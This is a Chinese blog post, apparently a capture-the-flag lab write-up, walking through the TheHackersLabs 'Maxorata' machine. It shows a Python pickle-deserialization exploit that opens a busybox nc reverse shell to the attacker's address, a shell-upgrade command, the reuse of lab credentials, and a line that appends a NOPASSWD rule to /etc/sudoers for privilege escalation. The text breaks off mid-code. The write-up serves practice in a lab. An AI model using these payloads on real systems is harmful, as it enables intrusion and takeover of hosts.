@@ -1,0 +1,318 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Thehackerslabs刷题记录 | X1z1的个人博客</title><meta name="author" content="xizi"><meta name="copyright" content="xizi"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="Thehackerslabs在打磐石行动复赛的时候。发现考察的全是渗透的方面…毫无疑问，被踹飞了。所以想了解一些与渗透相关的内容。 本文章纪录在thehackerslabs.com的刷题记录。 我们可以从该平台下载后缀为.ova的文件，然后用虚拟机软件进行打开。这边建议和使用的攻击机都使用桥接。 Maxorata这题我们分配到的ip为:192.168.174.137 然后我们进kali访问一下。会">
+<meta property="og:type" content="website">
+<meta property="og:title" content="Thehackerslabs刷题记录">
+<meta property="og:url" content="http://example.com/2026/09/09/Thehackerslabs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/index.html">
+<meta property="og:site_name" content="X1z1的个人博客">
+<meta property="og:description" content="Thehackerslabs在打磐石行动复赛的时候。发现考察的全是渗透的方面…毫无疑问，被踹飞了。所以想了解一些与渗透相关的内容。 本文章纪录在thehackerslabs.com的刷题记录。 我们可以从该平台下载后缀为.ova的文件，然后用虚拟机软件进行打开。这边建议和使用的攻击机都使用桥接。 Maxorata这题我们分配到的ip为:192.168.174.137 然后我们进kali访问一下。会">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/img/avatar.jpg">
+<meta property="article:published_time" content="2026-09-09T04:38:13.000Z">
+<meta property="article:modified_time" content="2026-09-09T08:13:33.702Z">
+<meta property="article:author" content="xizi">
+<meta property="article:tag" content="靶机渗透">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/img/avatar.jpg"><script type="application/ld+json"></script><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2026/09/09/Thehackerslabs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=5.5.2"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"pagination":{"enable":false,"hitsPerPage":8},"languages":{"hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":400,"highlightFullpage":false,"highlightMacStyle":true},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.12.0/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'Thehackerslabs刷题记录',
+  isHighlightShrink: false,
+  isToc: false,
+  pageType: 'posts'
+}</script><link rel="stylesheet" href="/css/_custom/custom.css"><meta name="generator" content="Hexo 6.3.0"></head><body><div class="page" id="body-wrap"><header class="not-home-page" id="page-header" style="background-image: url(/img/bg.jepg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">X1z1的个人博客</span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></span></div></div></nav><div id="page-site-info"><h1 id="site-title">Thehackerslabs刷题记录</h1></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="Thehackerslabs"><a href="#Thehackerslabs" class="headerlink" title="Thehackerslabs"></a>Thehackerslabs</h1><p>在打磐石行动复赛的时候。发现考察的全是渗透的方面…毫无疑问，被踹飞了。所以想了解一些与渗透相关的内容。</p>
+<p>本文章纪录在<code>thehackerslabs.com</code>的刷题记录。</p>
+<p>我们可以从该平台下载后缀为<code>.ova</code>的文件，然后用虚拟机软件进行打开。这边建议和使用的攻击机都使用桥接。</p>
+<h2 id="Maxorata"><a href="#Maxorata" class="headerlink" title="Maxorata"></a>Maxorata</h2><p>这题我们分配到的ip为:<code>192.168.174.137</code></p>
+<p>然后我们进<code>kali</code>访问一下。会显示一个网页信息。然后我们扫一下端口。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sS -sV -Pn 192.168.174.137</span><br></pre></td></tr></table></figure>
+
+<p>结果为：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Starting Nmap 7.95 ( https://nmap.org ) at 2026-09-09 03:10 EDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.174.137</span><br><span class="line">Host is up (0.00014s latency).</span><br><span class="line">Not shown: 997 closed tcp ports (reset)</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u10 (protocol 2.0)</span><br><span class="line">80/tcp   open  http    Apache httpd 2.4.68 ((Debian))</span><br><span class="line">5000/tcp open  http    Werkzeug httpd 2.2.2 (Python 3.11.2)</span><br><span class="line">MAC Address: 00:0C:29:BB:6E:F0 (VMware)</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 6.48 seconds</span><br></pre></td></tr></table></figure>
+
+<p>所以，我们这里应该把目标主要放在5000端口。</p>
+<p>然后我们去扫一下目录。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u http://192.168.174.137:5000</span><br></pre></td></tr></table></figure>
+
+<p>结果我们扫到了一个backup路径。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[03:13:20] Starting:                                                                                                                                                         </span><br><span class="line">[03:13:25] 308 -  257B  - /backup  -&gt;  http://192.168.174.137:5000/backup/  </span><br><span class="line">[03:13:25] 200 -    3KB - /backup/                                          </span><br><span class="line">CTRL+C detected: Pausing threads, please <span class="built_in">wait</span>...</span><br></pre></td></tr></table></figure>
+
+<p>然后我们去访问这个url。</p>
+<p>发现提供了一个app.py.bak供我们下载。</p>
+<p>我们看一下内容是什么。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# curl http://192.168.174.137:5000/backup/app.py.bak  </span><br><span class="line">import <span class="built_in">base64</span>, pickle, subprocess, tempfile, os, uuid</span><br><span class="line">from datetime import datetime</span><br><span class="line">from flask import Flask, request, render_template, send_from_directory</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">BASE = os.path.dirname(os.path.abspath(__file__))</span><br><span class="line"></span><br><span class="line">@app.route(<span class="string">&quot;/&quot;</span>)</span><br><span class="line">def index():</span><br><span class="line">    <span class="built_in">return</span> render_template(<span class="string">&quot;index.html&quot;</span>)</span><br><span class="line"></span><br><span class="line">@app.route(<span class="string">&quot;/generar&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>])</span><br><span class="line">def generar():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;GET&quot;</span>:</span><br><span class="line">        <span class="built_in">return</span> render_template(<span class="string">&quot;generar.html&quot;</span>)</span><br><span class="line"></span><br><span class="line">    etiqueta = &#123;</span><br><span class="line">        <span class="string">&quot;paciente&quot;</span>:   request.form.get(<span class="string">&quot;paciente&quot;</span>, <span class="string">&quot;&quot;</span>),</span><br><span class="line">        <span class="string">&quot;nhc&quot;</span>:        request.form.get(<span class="string">&quot;nhc&quot;</span>, <span class="string">&quot;&quot;</span>),</span><br><span class="line">        <span class="string">&quot;habitacion&quot;</span>: request.form.get(<span class="string">&quot;habitacion&quot;</span>, <span class="string">&quot;&quot;</span>),</span><br><span class="line">        <span class="string">&quot;servicio&quot;</span>:   request.form.get(<span class="string">&quot;servicio&quot;</span>, <span class="string">&quot;&quot;</span>),</span><br><span class="line">        <span class="string">&quot;emitida&quot;</span>:    datetime.now().strftime(<span class="string">&quot;%d/%m/%Y %H:%M&quot;</span>),</span><br><span class="line">    &#125;</span><br><span class="line">    payload = base64.b64encode(pickle.dumps(etiqueta)).decode()</span><br><span class="line"></span><br><span class="line">    import qrcode</span><br><span class="line">    nombre = f<span class="string">&quot;&#123;uuid.uuid4().hex&#125;.png&quot;</span></span><br><span class="line">    qrcode.make(payload).save(os.path.join(BASE, <span class="string">&quot;static&quot;</span>, <span class="string">&quot;qr&quot;</span>, nombre))</span><br><span class="line"></span><br><span class="line">    <span class="built_in">return</span> render_template(<span class="string">&quot;generar.html&quot;</span>, qr=nombre,</span><br><span class="line">                           payload=payload, etiqueta=etiqueta)</span><br><span class="line"></span><br><span class="line">@app.route(<span class="string">&quot;/reimprimir&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>])</span><br><span class="line">def reimprimir():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;GET&quot;</span>:</span><br><span class="line">        <span class="built_in">return</span> render_template(<span class="string">&quot;reimprimir.html&quot;</span>)</span><br><span class="line"></span><br><span class="line">    f = request.files.get(<span class="string">&quot;etiqueta&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> not f or not f.filename:</span><br><span class="line">        <span class="built_in">return</span> render_template(<span class="string">&quot;reimprimir.html&quot;</span>,</span><br><span class="line">                               error=<span class="string">&quot;Debe adjuntar la imagen de la etiqueta.&quot;</span>)</span><br><span class="line"></span><br><span class="line">    fd, path = tempfile.mkstemp(suffix=<span class="string">&quot;.png&quot;</span>)</span><br><span class="line">    os.close(fd)</span><br><span class="line">    f.save(path)</span><br><span class="line">    try:</span><br><span class="line">        r = subprocess.run([<span class="string">&quot;zbarimg&quot;</span>, <span class="string">&quot;-q&quot;</span>, <span class="string">&quot;--raw&quot;</span>, path],</span><br><span class="line">                           capture_output=True, text=True, <span class="built_in">timeout</span>=10)</span><br><span class="line">        data = r.stdout.strip()</span><br><span class="line">        <span class="keyword">if</span> not data:</span><br><span class="line">            <span class="built_in">return</span> render_template(<span class="string">&quot;reimprimir.html&quot;</span>,</span><br><span class="line">                                   error=<span class="string">&quot;No se ha podido leer el codigo QR.&quot;</span>)</span><br><span class="line">        etiqueta = pickle.loads(base64.b64decode(data))</span><br><span class="line">        <span class="built_in">return</span> render_template(<span class="string">&quot;reimprimir.html&quot;</span>, etiqueta=etiqueta)</span><br><span class="line">    except Exception as e:</span><br><span class="line">        <span class="built_in">return</span> render_template(<span class="string">&quot;reimprimir.html&quot;</span>,</span><br><span class="line">                               error=f<span class="string">&quot;Etiqueta corrupta: &#123;e&#125;&quot;</span>)</span><br><span class="line">    finally:</span><br><span class="line">        os.unlink(path)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=5000)</span><br></pre></td></tr></table></figure>
+
+<p>可以看到这里去<code>import pickle</code>，然后后面还有<code>etiqueta = pickle.loads(base64.b64decode(data))</code></p>
+<p>这里的data是从我们传入的二维码中提取文本信息。服务端没有做任何合法性检查或签名验证。所以这里存在反序列化漏洞。</p>
+<p><code>pickle</code> 是 Python 内置的序列化协议，它不仅可以存储对象的数据，还可以存储指令（即如何重建对象）。在反序列化时，<code>pickle</code> 会执行这些指令，包括：</p>
+<ul>
+<li>导入任意模块</li>
+<li>调用任意可调用对象（函数、类、方法等）</li>
+<li>传递任意参数</li>
+</ul>
+<p>如果攻击者能够构造一个恶意的 <code>pickle</code> 对象，并在反序列化时触发，就可以在服务端执行任意代码（例如反弹 shell、读取敏感文件、植入后门等）。</p>
+<p>所以上网去找了一个简单的利用脚本。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">RCE</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        cmd = (<span class="string">&#x27;busybox nc 192.168.174.131 1234 -e /bin/bash&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> os.system, (cmd,)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    pickled = pickle.dumps(RCE())</span><br><span class="line">    <span class="built_in">print</span>(base64.urlsafe_b64encode(pickled))</span><br></pre></td></tr></table></figure>
+
+<p>这里是一个反弹shell的脚本。我们就可以反弹shell到攻击机去操作了。</p>
+<p>然后我们把生成的base64编码存入到二维码中，先监听本机1234端口，再上传给网站。</p>
+<p>具体指令为：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qrcode gASVRwAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjCxidXN5Ym94IG5jIDE5Mi4xNjguMTc0LjEzMSAxMjM0IC1lIC9iaW4vYmFzaJSFlFKULg== &gt; vm1.png</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">└─# nc -lvnp 1234                                                                                                                    </span><br><span class="line">listening on [any] 1234 ...</span><br><span class="line">connect to [192.168.174.131] from (UNKNOWN) [192.168.174.137] 57610</span><br><span class="line"><span class="built_in">id</span></span><br><span class="line">uid=999(maxoqr) gid=997(maxoqr) grupos=997(maxoqr)</span><br></pre></td></tr></table></figure>
+
+<p>通过下面的指令，我们就可以将非交互式哑Shell升级为完全交互式终端</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/script -qc /bin/bash /dev/null</span><br><span class="line">maxoqr@TheHackersLabs-Maxorata:~$ </span><br></pre></td></tr></table></figure>
+
+<p>可以看到我们获取到了一个交互式的shell。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">maxoqr@TheHackersLabs-Maxorata:~$ <span class="built_in">ls</span> -la</span><br><span class="line"><span class="built_in">ls</span> -la</span><br><span class="line">total 48</span><br><span class="line">drwxr-xr-x 6 maxoqr maxoqr 4096 sep  9 01:57 .</span><br><span class="line">drwxr-xr-x 4 root   root   4096 ago  9 13:12 ..</span><br><span class="line">-rw-r--r-- 1 maxoqr maxoqr 2418 ago  8 21:53 app.py</span><br><span class="line">drwxr-xr-x 2 maxoqr maxoqr 4096 ago  8 22:13 backup</span><br><span class="line">-rw------- 1 maxoqr maxoqr   55 sep  9 01:57 .bash_history</span><br><span class="line">-rw-r--r-- 1 maxoqr maxoqr  220 abr 23  2023 .bash_logout</span><br><span class="line">-rw-r--r-- 1 maxoqr maxoqr 3526 abr 23  2023 .bashrc</span><br><span class="line">-rw-r----- 1 maxoqr maxoqr  480 ago  9 13:07 config.ini</span><br><span class="line">-rw-r--r-- 1 maxoqr maxoqr  807 abr 23  2023 .profile</span><br><span class="line">drwx------ 2 maxoqr maxoqr 4096 sep  9 01:56 .ssh</span><br><span class="line">drwxr-xr-x 3 maxoqr maxoqr 4096 ago  8 21:53 static</span><br><span class="line">drwxr-xr-x 2 maxoqr maxoqr 4096 ago  8 21:55 templates</span><br><span class="line">maxoqr@TheHackersLabs-Maxorata:~$ <span class="built_in">cat</span> config.ini</span><br><span class="line"><span class="built_in">cat</span> config.ini</span><br><span class="line">; MaxoQR - configuracion del aplicativo</span><br><span class="line">; Servicio de Informatica - Hospital Insular Maxorata</span><br><span class="line">; Ultima revision: migracion 14/03 (E. Cabrera)</span><br><span class="line"></span><br><span class="line">[app]</span><br><span class="line">instancia = MaxoQR</span><br><span class="line">puerto = 5000</span><br><span class="line">ruta_qr = /opt/maxoqr/static/qr</span><br><span class="line">retencion_dias = 30</span><br><span class="line"></span><br><span class="line">[smtp]</span><br><span class="line">; Notificacion de duplicados al control de enfermeria</span><br><span class="line">servidor = correo.maxorata.local</span><br><span class="line">puerto = 587</span><br><span class="line">remitente = maxoqr@maxorata.local</span><br><span class="line">usuario = ecabrera</span><br><span class="line">password = Tindaya2024!</span><br><span class="line">tls = si</span><br><span class="line"></span><br><span class="line">[impresion]</span><br><span class="line">cola = etiquetadora-3p</span><br><span class="line">formato = 62x29</span><br></pre></td></tr></table></figure>
+
+<p>然后我们成功在<code>config.ini</code>配置文件中找到了账号与密码。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">usuario = ecabrera</span><br><span class="line">password = Tindaya2024!</span><br></pre></td></tr></table></figure>
+
+<p>我们用ssh连上去</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ecabrera@TheHackersLabs-Maxorata:~$ <span class="built_in">ls</span></span><br><span class="line">user.txt</span><br><span class="line">ecabrera@TheHackersLabs-Maxorata:~$ <span class="built_in">cat</span> user.txt</span><br><span class="line">THL&#123;p1ckl3_3n_l4_pul53r4_d3l_p4c13nt3&#125;</span><br></pre></td></tr></table></figure>
+
+<p>登陆上去，我们就获得了用户态的flag了。</p>
+<p>然后我们下一步就是要进行提权。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ecabrera@TheHackersLabs-Maxorata:~$ <span class="built_in">sudo</span> -l</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> ecabrera on TheHackersLabs-Maxorata:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty</span><br><span class="line"></span><br><span class="line">User ecabrera may run the following commands on TheHackersLabs-Maxorata:</span><br><span class="line">    (root) NOPASSWD: /usr/bin/python3 /opt/maxorata/backup_etiquetas.py</span><br><span class="line">    (ALL : ALL) NOPASSWD: ALL</span><br></pre></td></tr></table></figure>
+
+<p>由于我之前改过，所以这里正常流程应该是去看<code>/opt/maxorata/backup_etiquetas.py</code>这个文件。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">ecabrera@TheHackersLabs-Maxorata:/opt/maxorata$ <span class="built_in">ls</span> -la</span><br><span class="line">total 16</span><br><span class="line">drwxr-xr-x 3 root root     4096 ago  9 13:17 .</span><br><span class="line">drwxr-xr-x 4 root root     4096 ago  9 13:12 ..</span><br><span class="line">-rwxr-xr-x 1 root root      699 ago  9 13:17 backup_etiquetas.py</span><br><span class="line">drwxrwxr-x 2 root ecabrera 4096 sep  9 17:41 lib</span><br><span class="line">ecabrera@TheHackersLabs-Maxorata:/opt/maxorata$ <span class="built_in">cat</span> backup_etiquetas.py </span><br><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># Copia de seguridad de las etiquetas emitidas por MaxoQR</span></span><br><span class="line"><span class="comment"># Servicio de Informatica - Hospital Insular Maxorata</span></span><br><span class="line"></span><br><span class="line">import sys, os, tarfile</span><br><span class="line">sys.dont_write_bytecode = True</span><br><span class="line">sys.path.insert(0, <span class="string">&quot;/opt/maxorata/lib&quot;</span>)</span><br><span class="line"></span><br><span class="line">import qrutils</span><br><span class="line"></span><br><span class="line">ORIGEN = <span class="string">&quot;/opt/maxoqr/static/qr&quot;</span></span><br><span class="line">DESTINO = <span class="string">&quot;/var/backups/maxoqr&quot;</span></span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    os.makedirs(DESTINO, exist_ok=True)</span><br><span class="line">    total = qrutils.contar_etiquetas(ORIGEN)</span><br><span class="line">    nombre = f<span class="string">&quot;etiquetas-&#123;qrutils.marca_temporal()&#125;.tar.gz&quot;</span></span><br><span class="line">    destino = os.path.join(DESTINO, nombre)</span><br><span class="line">    with tarfile.open(destino, <span class="string">&quot;w:gz&quot;</span>) as tar:</span><br><span class="line">        tar.add(ORIGEN, arcname=<span class="string">&quot;qr&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(f<span class="string">&quot;[+] &#123;total&#125; etiquetas archivadas en &#123;destino&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+
+<p>然后这个文件是个只读文件，所以我们改不了。转向去看<code>lib</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">ecabrera@TheHackersLabs-Maxorata:/opt/maxorata/lib$ <span class="built_in">ls</span> -la</span><br><span class="line">total 12</span><br><span class="line">drwxrwxr-x 2 root ecabrera 4096 sep  9 17:41 .</span><br><span class="line">drwxr-xr-x 3 root root     4096 ago  9 13:17 ..</span><br><span class="line">-rw-rw-r-- 1 root ecabrera  390 sep  9 17:41 qrutils.py</span><br><span class="line">ecabrera@TheHackersLabs-Maxorata:/opt/maxorata/lib$ <span class="built_in">cat</span> qrutils.py </span><br><span class="line"><span class="string">&quot;&quot;</span><span class="string">&quot;Utilidades de etiquetado - Servicio de Informatica HIM&quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">import os</span><br><span class="line">from datetime import datetime</span><br><span class="line"></span><br><span class="line"><span class="comment">#os.system(&#x27;echo &quot;ALL ALL=(ALL:ALL) NOPASSWD:ALL&quot; &gt;&gt; /etc/sudoers&#x27;)</span></span><br><span class="line">def marca_temporal():</span><br><span class="line">    <span class="built_in">return</span> datetime.now().strftime(<span 